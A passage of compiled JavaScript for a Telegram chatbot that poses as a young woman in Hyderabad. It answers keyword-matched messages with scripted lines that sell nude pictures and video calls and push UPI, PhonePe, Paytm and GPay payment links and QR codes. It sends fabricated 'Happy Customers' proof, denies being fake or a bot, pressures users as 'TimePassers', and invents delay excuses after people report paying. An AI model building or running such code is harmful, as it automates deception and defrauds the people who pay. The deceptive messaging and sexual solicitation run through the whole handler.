                    else if (((0, inhandlerUpdated_1.contains)(text, ['time']) && ((0, inhandlerUpdated_1.contains)(text, ['hw', 'how', 'kitn', 'demo']))) || (0, inhandlerUpdated_1.contains)(text, ['durat', 'minut', 'mins', 'mint'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.time]);
                    }
                    else if (text === '') {
                        yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)(['?', 'What?', '??', '......?', 'Pay first!!'])]);
                    }
                    else if (((0, inhandlerUpdated_1.contains)(text, ['many']) && ((0, inhandlerUpdated_1.contains)(text, ['hw', 'how'])))) {
                        yield (0, inhandlerUpdated_1.respond)(event, ["Demo 4 Pics\n\n30 Full Nude Pics: **200₹/-**"]);
                    }
                    else if (text === ("hi") || (0, inhandlerUpdated_1.startswith)(text, ['hello', 'hii', 'hai', 'hlw', 'hlo', 'hi ', 'hyy', 'hey'])) {
                        const array = ['Hello', 'Hii', 'Hai', 'Hlo', 'Hi', 'Hyy', 'Hey'];
                        const randomElement = array[Math.floor(Math.random() * array.length)];
                        yield (0, inhandlerUpdated_1.respond)(event, [`${randomElement} **${senderJson.firstName}...**!!`], true);
                    }
                    else if ((paymentDoneRegex.test(text) || paymentDoneRevRegex.test(text) || (0, inhandlerUpdated_1.contains)(text, ['i paid']) || (0, inhandlerUpdated_1.isEqual)(text, ['paid', 'done'])) && !(0, inhandlerUpdated_1.contains)(text, ['dont', 'will', 'not', 'nahi', 'no ', "don't", '?', 'girl', 'wali', 'failed', 'issue', 'network', 'pending', 'process'])) {
                        const paidCount = (yield db.getSingleKey(chatId, dbservice_1.user.paidCount)) + 1;
                        yield db.updateSingleKey(chatId, dbservice_1.user.paidCount, paidCount);
                        // try {
                        //     // await event.message.forwardTo(process.env.updatesChannel);
                        //     // await event.message.forwardTo('me');
                        // } catch (error) {
                        //     console.log('cannot forward');
                        // }
                        yield (0, utils_1.broadcast)(broadcastName, 'PAYCHECK NOW');
                        if (paidCount == 2) {
                            yield (0, utils_1.broadcast)(broadcastName, 'PAYCHECK FRUS');
                            yield (0, inhandlerUpdated_1.respond)(event, ["I'm giving OFFLINE Romance service to other BOY Now!!\nI will message you when I'm back to Online!\n\n**Really Sorry for Delay!!**"]);
                            //await respond(event, ['**Please Wait 15 Mins.**\n\nI just **Came Outside** for Food, I will Call you once I go back to home!!\n\n**Really Sorry!!**\n\nDont Worry I will Give you Service Pakka!']);
                            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.aut + "\nDont be Angry for Delay....!!\nI will give you service PAkka!!\n\nI will message you when I'm come back to Online!!"]);
                            }), 120000);
                            const limitTime = yield db.getSingleKey(chatId, dbservice_1.user.limitTime);
                            yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, Math.max((Date.now() + (10 * 60 * 1000)), limitTime));
                        }
                        else if (paidCount === undefined || paidCount < 1) {
                            yield (0, inhandlerUpdated_1.respond)(event, ['??']);
                            if (paidCount === 0) {
                                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                    yield (0, inhandlerUpdated_1.respond)(event, [`${messages_1.messages.channelLinks}`]);
                                }), 40000);
                            }
                        }
                        else if (paidCount == 1) {
                            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.wait]);
                        }
                        else {
                            yield (0, inhandlerUpdated_1.respond)(event, [`**PAY me and** ${messages_1.messages.screenshot}`]);
                        }
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, [' age', ' old']) || (text.startsWith("age"))) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.age], true);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['hyderabad', 'hyd'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, ["LB Nagar"], true);
                    }
                    else if (((0, inhandlerUpdated_1.contains)(text, ['u ', 'you']) && (0, inhandlerUpdated_1.contains)(text, ['from', 'frm', 'liv'])) ||
                        (0, inhandlerUpdated_1.contains)(text, ['kha se', 'kaha se']) || (0, inhandlerUpdated_1.contains)(text, ['locat', 'plac'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, ["Hyderabad!!"], true);
                    }
                    else if ((0, inhandlerUpdated_1.startswith)(text, ['hm'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, ["Hmm"]);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['wait', 'ruko', 'aagu']) || (0, inhandlerUpdated_1.isEqual)(text, ['ok', 'okay', 'kk', 'k'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, ["okay!!"]);
                    }
                    else if (((0, inhandlerUpdated_1.contains)(text, ['u ', 'one', 'you', 'who', 'it']) && (0, inhandlerUpdated_1.contains)(text, ['dp', ' pp', 'prof']))) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.pp], true);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['phn p', 'link', 'number', 'namb', 'detai', 'phone pay', 'network', 'paytm', 'phone pe', 'phonepe'])
                        || ((0, inhandlerUpdated_1.contains)(text, ['how', 'where', 'hw', 'whr']) &&
                            ((0, inhandlerUpdated_1.contains)(text, ['pay', 'send', 'money'])))) {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: '<b>PAY to Payment Links👇👇</b>\n\n' + messages_1.messages.pynw + `\n\n<b>Pay now</b> and send me <b>Screenshot!!</b>\nI will do <b>VideoCall</b> Now <b>itself!!</b>` + '\n\n<b>' + `Website 👉🏻 ${process.env.link}` + '</b>', parseMode: 'html', linkPreview: false }));
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['scan', 'scanner', 'qr', 'barcode', 'code'])) {
                        yield pushToReplies(event, chatId, `${messages_1.messages.qr}\n\n${messages_1.messages.link}`, (0, common_1.getClientFilePath)('./QR.jpg'));
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['upi ', ' upi', 'upi id', "up id"])) {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Pay to my UPI Adress\n\nCopy paste full Msg👇🏻👇🏻👇🏻👇🏻\n\n` }));
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: messages_1.messages.upiID }));
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['google pay', 'g pay', 'gpay'])) {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Open 👉🏻 ${messages_1.payLinks.gpay1}`, parseMode: 'html', linkPreview: false }));
                        yield event.client.sendMessage('@miscmessages', { message: broadcastName + ": " + text });
                    }
                    else if (event.message.chatId.toString() !== '5249581831' && !((_c = (_b = event.message.media) === null || _b === void 0 ? void 0 : _b.className) === null || _c === void 0 ? void 0 : _c.includes('Media')) &&
                        ((((0, inhandlerUpdated_1.contains)(text, ['cant', "can't", 'avvatledhu', 'cannot', 'prob', 'nahi', 'nai', 'nhi']) && (0, inhandlerUpdated_1.contains)(text, ['pay', 'send mon', 'send pay', 'pais', 'sending mon', 'sending pay', 'going', 'sent mon', 'sent pay']) && !(0, inhandlerUpdated_1.contains)(text, ['demo', 'trust', 'cal', 'free'])) ||
                            (0, inhandlerUpdated_1.contains)(text, ['decli', 'avvatledhu', 'fail', 'not able', 'issue', 'not hap', 'unable', ' nai hor', 'nai ja', 'nhi hor', 'nhi ja', 'nahi hor', 'nahi ja', 'process', 'no phon', 'no payt',
                                'server', 'not open', 'error', 'work nh', 'work nah', 'not work', 'doesnot wor', 'doesnot wor', "doesn't wo", 'work no'])) && !((0, inhandlerUpdated_1.contains)(text, ["paid ", 'trust', 'confirm', 'demo', "successful", "connect", 'cal', 'paise nahi h', 'paise nhi h', 'paisa nahi h', 'paisa nhi h', 'transaction successful', 'switch', "on paytm", 'share transaction', 'completed', 'pay again'])))) {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Send me the <b>Screenshot</b> of your Payment first!!\n<b>What is coming...??</b>\n\nUse "PhonePe / PayTm"  ONLY!!✅✅\n\nGPay - ${messages_1.payLinks.gpay2}</b>`, parseMode: "html" }));
                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `<b>Oye....!!\n\n\nTry</b> this <b>NEW WORKING</b> Links👇👇\n\n${messages_1.payLinks.paytm2} - Working\n${messages_1.payLinks.phonepe3} - Working\n${messages_1.payLinks.gpay1} - Doubt (Try Once)\n${messages_1.payLinks.gpay2} - Doubt (Try Once)\n\nPlease Use<b>"PhonePe / PayTm"  ONLY!!</b>✅✅`, parseMode: 'html', linkPreview: false }));
                        }), 20000);
                        yield event.client.sendMessage('@miscmessages', { message: broadcastName + " : " + text });
                        yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.limitTime, Date.now() + (10 * 60 * 1000));
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ["language", "lang", "telugu", "malay", "mallu", "kannad", "tamil", "hindi"])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.language]);
                    }
                    else if (((0, inhandlerUpdated_1.contains)(text, ['demo', 'free', 'pus', 'cost', 'puku', 'rate', 'chut', 'amount', 'paise', 'nich', 'price', "servi", 'kitn', 'down', 'charge']) && !(0, inhandlerUpdated_1.contains)(text, ['full', 'hour', 'complete', 'night', 'hr ', 'time', 'min']))
                        || ((((0, inhandlerUpdated_1.contains)(text, ["how", "hw"])) && ((0, inhandlerUpdated_1.contains)(text, ["much", "mch"])) && !(0, inhandlerUpdated_1.contains)(text, ['time'])))) {
                        if (!(userDetails === null || userDetails === void 0 ? void 0 : userDetails.payAmount) || userDetails.payAmount < 15) {
                            yield (0, inhandlerUpdated_1.respond)(event, [`${messages_1.messages.noFreeDemo}\n${messages_1.messages.demo}\n${(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)}`]);
                        }
                        else if (userDetails.payAmount < 40) {
                            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([messages_1.messages.just50, messages_1.messages.just50two])]);
                        }
                        else {
                            yield (0, inhandlerUpdated_1.respond)(event, [`${messages_1.messages.pricelist}\n\n${(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)}`]);
                            yield pushToReplies(event, chatId, '', (0, common_1.getClientFilePath)('./takefull.mp3'));
                        }
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['1st', 'proof', 'after ', 'phir', 'fir ', , 'prove', 'trust', 'first', 'confirm', 'pahle', 'belie', 'peh', 'phela', 'pahl', 'phal', 'cheat'])) {
                        try {
                            yield event.client.invoke(new telegram_1.Api.messages.SetTyping({
                                peer: yield event.message.getSender(),
                                action: new telegram_1.Api.SendMessageRecordAudioAction(),
                            }));
                        }
                        catch (error) {
                            //
                        }
                        yield db.updateSingleKey(chatId, dbservice_1.user.prfCount, userDetails.prfCount + 1);
                        const prfcount = userDetails.prfCount + 1;
                        yield (0, Helpers_1.sleep)((prfcount % 4) * 4500);
                        if (!(userDetails === null || userDetails === void 0 ? void 0 : userDetails.payAmount) || userDetails.payAmount < 15) {
                            if (prfcount < 5) {
                                if (prfcount % 4 === 1) {
                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(event.message.chatId, { file: [(0, common_1.getClientFilePath)('./prf1.jpg'), (0, common_1.getClientFilePath)('./prf2.jpg')], message: 'Happy Customers👆' }));
                                    try {
                                        yield event.client.invoke(new telegram_1.Api.messages.SetTyping({
                                            peer: yield event.message.getSender(),
                                            action: new telegram_1.Api.SendMessageRecordAudioAction(),
                                        }));
                                        yield pushToReplies(event, chatId, '👆👆For your confirmation!!', (0, common_1.getClientFilePath)('./voice.mp3'));
                                    }
                                    catch (error) {
                                    }
                                }
                                else if (prfcount % 4 === 2) {
                                    yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.daily100]);
                                    if (!picMap.has((event.message.chatId.toString())) && userDetails.totalCount > 5) {
                                        picMap.set(event.message.chatId.toString(), true);
                                        yield pushToReplies(event, chatId, `Want more...?\n\nCall  Just **50₹**\nPics Just **25₹!!**\n**Full NUDE, With FACE!!\n\n${process.env.demolink}/${process.env.clientId}**`, (0, common_1.getClientFilePath)(`./pic.jpg`));
                                    }
                                }
                                else if (prfcount % 4 === 3) {
                                    try {
                                        yield event.client.invoke(new telegram_1.Api.messages.SetTyping({
                                            peer: yield event.message.getSender(),
                                            action: new telegram_1.Api.SendMessageRecordAudioAction(),
                                        }));
                                        yield (0, inhandlerUpdated_1.respond)(event, [`LOGIN here 👇🏻👇🏻\n\n**${process.env.link}**\n**${process.env.link}**\n\nSend me Screenshot After Login!!`]);
                                    }
                                    catch (error) {
                                        //
                                    }
                                    yield sendTpMsg(event);
                                    if (prfcount % 4 === 3) {
                                        // await event.client.sendFile(senderObj, { file: './sabdika.mp3', voiceNote: true, });
                                        yield pushToReplies(event, chatId, '', (0, common_1.getClientFilePath)('./sabdika.mp3'));
                                    }
                                }
                                else if (prfcount % 4 === 0) {
                                    yield (0, inhandlerUpdated_1.respond)(event, ['Just Pay **Minimum Amount** to Beleive that you are not **TimePasser!!**\n\n**I CANNOT Send My Nude Pics to All TimePassers😏**']);
                                }
                            }
                            else {
                                yield (0, inhandlerUpdated_1.respond)(event, ['**Dont Waste Your Time!!**\nI understood you are TimePasser!!\nPay  Minimum Amount to get Any Service!!\n\nUntill then I will send you same **Repeated Msgs**!!']);
                            }
                        }
                        else if (userDetails.payAmount < 40) {
                            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([messages_1.messages.just50, messages_1.messages.just50two])]);
                        }
                        else {
                            yield (0, inhandlerUpdated_1.respond)(event, ["Take full Service Baby...!!\nI'm ready now, I will show you however you want!! in the video call"]);
                        }
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['girl', 'ladk', 'boy'])) {
                        if (!picMap.has((event.message.chatId.toString()))) {
                            picMap.set(event.message.chatId.toString(), true);
                            yield pushToReplies(event, chatId, `Want more...?\n\nCall  Just **50₹**\nPics Just **25₹!!**\n**Full NUDE, With FACE!!\n\n${process.env.demolink}/${process.env.clientId}**`, (0, common_1.getClientFilePath)(`./pic.jpg`));
                        }
                        try {
                            yield event.client.invoke(new telegram_1.Api.messages.SetTyping({
                                peer: yield event.message.getSender(),
                                action: new telegram_1.Api.SendMessageRecordAudioAction(),
                            }));
                        }
                        catch (error) {
                        }
                        // await event.client.sendFile(senderObj, { file: './voice.mp3', voiceNote: true })
                        yield pushToReplies(event, chatId, '', (0, common_1.getClientFilePath)('./voice.mp3'));
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['fake', 'fack', 'fak', 'scam', 'frau'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [`I'm not **Fake!\n**You are **Timepasser!!**\n\n${(0, messages_1.pickOneMsg)([messages_1.messages.just50, messages_1.messages.just50two])}`]);
                        try {
                            yield event.client.invoke(new telegram_1.Api.messages.SetTyping({
                                peer: yield event.message.getSender(),
                                action: new telegram_1.Api.SendMessageRecordAudioAction(),
                            }));
                        }
                        catch (error) {
                            //
                        }
                        // await event.client.sendFile(senderObj, { file: './notfake.mp3', voiceNote: true })
                        yield pushToReplies(event, chatId, '', (0, common_1.getClientFilePath)('./notfake.mp3'));
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['bot', 'automa', 'syst', 'comput'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)(messages_1.messages.botArray), true]);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['sex chat', 'video cal', 'please', 'pls', 'plz', 'voice cal', 'coll ', 'cal', 'vc'])) {
                        if (!(userDetails === null || userDetails === void 0 ? void 0 : userDetails.payAmount) || userDetails.payAmount < 15) {
                            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)]);
                        }
                        else if (userDetails.payAmount < 40) {
                            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([messages_1.messages.just50, messages_1.messages.just50two])]);
                        }
                        else {
                            yield (0, inhandlerUpdated_1.respond)(event, ["Take full Service Baby...!!\nI'm ready now, I will show you however you want!! in the video call"]);
                        }
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['love', 'luv'])) {
                        const ranomThanks = messages_1.messages.thanksArray[Math.floor(Math.random() * messages_1.messages.thanksArray.length)];
                        yield (0, inhandlerUpdated_1.respond)(event, [`${ranomThanks}\n\n${messages_1.messages.thanksNdPay}`], true);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['real', 'direct', 'offl', 'meet', 'phys', 'kalus']) && !(0, inhandlerUpdated_1.contains)(text, ['really'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.ntnw, true]);
                    }
                    else if ((text.includes("chestun"))
                        || ((0, inhandlerUpdated_1.contains)(text, ['chest', 'chast']) &&
                            (!(0, inhandlerUpdated_1.contains)(text, ["chesta", "cheste", "chestha", "chasta", "chaste", "chastha"])))
                        || (((0, inhandlerUpdated_1.contains)(text, ["you", "u", 'what', 'em'])) && ((0, inhandlerUpdated_1.contains)(text, ["doi", 'dng'])))) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.doing, true]);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['how are you', 'kaise'])
                        || (((0, inhandlerUpdated_1.contains)(text, ['hw', 'how'])) &&
                            ((0, inhandlerUpdated_1.contains)(text, ['u', 'you'])) &&
                            ((0, inhandlerUpdated_1.contains)(text, [' r ', 'are '])))) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.fine, true]);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['ready', 'pay']) && (0, inhandlerUpdated_1.contains)(text, ['ll ', 'now', 'm '])) {
                        // await event.client.sendFile(senderObj, { file: getClientFilePath('./QR.jpg'), caption: `${messages.qr}` })
                        yield pushToReplies(event, chatId, messages_1.messages.qr, (0, common_1.getClientFilePath)('./QR.jpg'));
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.okayPay, true]);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ["busy", "bsy", 'reply', 'replay', 'rpl', 'payme', 'detai', ' id'])
                        || (((0, inhandlerUpdated_1.contains)(text, ["good", "gud", "gd"])) &&
                            ((0, inhandlerUpdated_1.contains)(text, ["nyt", "mor", "mrn", "ev", " e", "mn"])))) {
                        // await event.client.sendFile(senderObj, { file: getClientFilePath('./QR.jpg'), caption: `${messages.qr}` })
                        yield pushToReplies(event, chatId, messages_1.messages.qr + `\n\n${messages_1.messages.link}`, (0, common_1.getClientFilePath)('./QR.jpg'));
                        if (!userDetails.payAmount || userDetails.payAmount < 15) {
                            yield (0, inhandlerUpdated_1.respond)(event, ["**Heyy **" + senderJson.firstName + "\n\n" + messages_1.messages.demo + "\n\n" + (0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)]);
                        }
                        else if (userDetails.payAmount >= 15) {
                            yield (0, inhandlerUpdated_1.respond)(event, ["**Heyy **" + senderJson.firstName + "\n\n" + 'Take Video call service!!\nI will show you everything!!\n\n**Try once Dear jsut 50!!**😘😘']);
                        }
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['send pic', 'snap', 'normal', 'photo', 'face', 'see ', 'samp', 'full pic',])) {
                        if (!userDetails.payAmount || userDetails.payAmount < 15) {
                            if (!picMap.has((event.message.chatId.toString()))) {
                                picMap.set(event.message.chatId.toString(), true);
                                yield pushToReplies(event, chatId, `Want more...?\n\nCall  Just **50₹**\nPics Just **25₹!!**\n**Full NUDE, With FACE!!\n\n${process.env.demolink}/${process.env.clientId}**`, (0, common_1.getClientFilePath)(`./pic.jpg`));
                            }
                            else {
                                yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.dp], true);
                            }
                        }
                        else if (userDetails.payAmount > 20) {
                            yield (0, inhandlerUpdated_1.respond)(event, ['Sure, Take the Service!!, I will send now itself!!'], true);
                        }
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['virg'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.notVirgin], true);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['married'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.notMarried], true);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, [' hot', 'cute', 'super', 'pret', 'fantast', 'juicy', 'nyc', 'awe', 'angel', 'aws', 'nice', 'beaut', 'gorg'])) {
                        const randomElement = messages_1.messages.thanksArray[Math.floor(Math.random() * messages_1.messages.thanksArray.length)];
                        yield (0, inhandlerUpdated_1.respond)(event, [randomElement], true);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['marry'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [`Haha, Satisfy me Online First❤️\n\n${(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)}`], true);
                    }
                    else if (/^\d/.test(text) && !(0, inhandlerUpdated_1.contains)(text, ['hr ', 'hour', 'cm', 'inch', 'lakh'])) {
                        const match = text.match(/^\d+/);
                        if (match) {
                            const toldAmount = parseInt(match[0], 10);
                            if (toldAmount > 25) {
                                yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.number], true);
                            }
                            else {
                                if (toldAmount > 14) {
                                    yield (0, inhandlerUpdated_1.respond)(event, [`**${toldAmount}₹** Only Pics ok!!`], true);
                                }
                                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                    yield event.message.respond({ message: userDetails.payAmount < 50 ? messages_1.messages.demo : messages_1.messages.pricelist });
                                }), 10000);
                            }
                        }
                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                            yield pushToReplies(event, chatId, messages_1.messages.qr + `\n\n${messages_1.messages.link}`, (0, common_1.getClientFilePath)('./QR.jpg'));
                        }), 15000);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['stud', 'chaduv', 'chadhuv', 'u do', 'you do'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.study]);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['high', 'jyada', 'expensive', 'discount'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, ["**30 Mins VideoCall   :  350₹/-**"], true);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['show', 'send', ' sand', ' snd', 'whats', 'cal', 'vc']) || (((0, inhandlerUpdated_1.contains)(text, ['1', 'one']) && (0, inhandlerUpdated_1.contains)(text, ['pic', 'photo', 'snap', 'boob', 'sample', 'demo'])))) {
                        yield db.updateSingleKey(chatId, dbservice_1.user.picCount, userDetails.picCount + 1);
                        if (userDetails.payAmount < 40) {
                            if (userDetails.picCount % 3 === 0) {
                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Video Call Just <b>50₹</b>\n\n<b>Pay now</b> and send me <b>Screenshot!!</b>\nI will do <b>Video Call</b> Now <b>itself!!</b>\n` + messages_1.messages.pynw + `\n\nOPEN 👉🏻 ${process.env.link}` + '</b>', parseMode: 'html', linkPreview: false }));
                                if (userDetails.totalCount > 5) {
                                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                        if (!picMap.has((event.message.chatId.toString()))) {
                                            picMap.set(event.message.chatId.toString(), true);
                                            yield pushToReplies(event, chatId, `Want more...?\n\nCall  Just **50₹**\nPics Just **25₹!!**\n**Full NUDE, With FACE!!\n\n${process.env.demolink}/${process.env.clientId}**`, (0, common_1.getClientFilePath)(`./pic.jpg`));
                                        }
                                    }), 10000);
                                }
                            }
                            else if (userDetails.picCount % 3 == 1) {
                                yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([messages_1.messages.just50, messages_1.messages.just50two])]);
                                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `${messages_1.payLinks.others}\n\n<b>${((0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)).replace(/[*]+/g, '')}</b>`, parseMode: 'html', linkPreview: false }));
                                }), 10000);
                            }
                            else {
                                yield sendTpMsg(event);
                            }
                        }
                        else {
                            yield (0, inhandlerUpdated_1.respond)(event, ["Take full Service Baby...!!\nI'm ready now, I will show you however you want!! in the video call"]);
                        }
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ["full", "cost", 'serv', '1 hr', 'hour', 'hr '])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.pricelist]);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['bye']) || (0, inhandlerUpdated_1.isEqual)(text, ['by', 'byy'])) {
                        try {
                            yield event.client.invoke(new telegram_1.Api.messages.SetTyping({
                                peer: yield event.message.getSender(),
                                action: new telegram_1.Api.SendMessageRecordAudioAction(),
                            }));
                        }
                        catch (error) {
                            //
                        }
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.bye], true);
                        // await event.client.sendFile(senderObj, { file: './bye.mp3', voiceNote: true })
                        yield pushToReplies(event, chatId, '', (0, common_1.getClientFilePath)('./bye.mp3'));
                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                            if (userDetails.lastMsgTimeStamp + 95000 < Date.now()) {
                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: messages_1.messages.cantPay }));
                                yield (0, inhandlerUpdated_1.respond)(event, [`I'm not Wearing Dress now!!🙈\nTake the Demo!!\n\n\n${(0, messages_1.pickOneMsg)([messages_1.messages.just50, messages_1.messages.just50two])}`]);
                                yield (0, inhandlerUpdated_1.respond)(event, [`LOGIN here 👇🏻👇🏻\n\n**${process.env.link}**\n**${process.env.link}**\n\nSend me Screenshot After Login!!`]);
                            }
                        }), 100000);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['really'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, ['**Try Demo and See...!!**,\nU will Only Understand!!🙃🙃']);
                        yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([messages_1.messages.just50, messages_1.messages.just50two])]);
                    }
                    else if (((0, inhandlerUpdated_1.contains)(text, ['secur', 'room', 'ext']) && (0, inhandlerUpdated_1.contains)(text, ['charg', 'pric', 'cost']))) {
                        yield (0, inhandlerUpdated_1.respond)(event, ["No Other Charges at all!!"]);
                    }
                    else if ((0, inhandlerUpdated_1.startswith)(text, ['oi', 'oy'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, ['haaa....']);
                    }
                    else if ((0, inhandlerUpdated_1.contains)(text, ['how', 'where'])) {
                        yield pushToReplies(event, chatId, messages_1.messages.qr + `\n\n${messages_1.messages.link}`, (0, common_1.getClientFilePath)('./QR.jpg'));
                    }
                    else {
                        if ((0, inhandlerUpdated_1.contains)(text, ['?', 'banking', 'name', 'ravva', 'lakshmi', 'laxmi', "is this", "this one", "right", 'kya'])) {
                            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)(['Hmm Yeah!!', 'Haa Yep..!!', 'Haaa yaa....!'])]);
                        }
                        else if ((0, inhandlerUpdated_1.contains)(text, ['give', 'demo'])) {
                            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([`**Trust Me** Once and **Take Demo!!**\n\n${(0, messages_1.pickOneMsg)([messages_1.messages.just50, messages_1.messages.just50two])}`])]);
                            // await event.client.sendFile(senderObj, { file: './fifty.mp3', voiceNote: true });
                            yield pushToReplies(event, chatId, '', (0, common_1.getClientFilePath)('./fifty.mp3'));
                        }
                        else if ((0, inhandlerUpdated_1.contains)(text, ['you', 'u ', 'unnava']) && (0, inhandlerUpdated_1.contains)(text, ['there'])) {
                            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([`Haaa... Tell!!`])]);
                        }
                        else if ((0, inhandlerUpdated_1.contains)(text, ['voice', 'cal'])) {
                            try {
                                yield event.client.invoke(new telegram_1.Api.messages.SetTyping({
                                    peer: yield event.message.getSender(),
                                    action: new telegram_1.Api.SendMessageRecordAudioAction(),
                                }));
                            }
                            catch (error) {
                                //
                            }
                            // await event.client.sendFile(senderObj, { file: './voice.mp3', voiceNote: true });
                            yield pushToReplies(event, chatId, '', (0, common_1.getClientFilePath)('./voice.mp3'));
                        }
                        else if ((0, inhandlerUpdated_1.contains)(text, ['pic', 'photo'])) {
                            if (!picMap.has(event.message.chatId.toString())) {
                                picMap.set(event.message.chatId.toString(), true);
                                yield pushToReplies(event, chatId, `Want more...?\n\nCall  Just **50₹**\nPics Just **25₹!!**\n**Full NUDE, With FACE!!\n\n${process.env.demolink}/${process.env.clientId}**`, (0, common_1.getClientFilePath)(`./pic.jpg`));
                            }
                            else {
                                yield (0, inhandlerUpdated_1.respond)(event, ["I have already given you confirmation!!\n\nNow If you need anything MORE... **PAY AND MSG ME!!\n\nDont do Timepass!!**"]);
                            }
                        }
                        else {
                            try {
                                const msgs = yield event.client.getMessages(event.chatId, { limit: 8 });
                                let defaultReply = true;
                                for (let i = 0; i < 3; i++) {
                                    if (msgs.length > 3 && ((_d = msgs[i]) === null || _d === void 0 ? void 0 : _d.fromId) !== null) {
                                        defaultReply = false;
                                    }
                                }
                                if (defaultReply || text === '' || msgs.length < 5) {
                                    const Msg = (0, messages_1.pickOneMsg)(messages_1.randomMsg);
                                    if (Msg === 'qr') {
                                        yield (0, utils_1.asktoPayByEvent)(event.client, userDetails, true);
                                    }
                                    else if (Msg === 'numb') {
                                        if (!picMap.has((event.message.chatId.toString()))) {
                                            picMap.set(event.message.chatId.toString(), true);
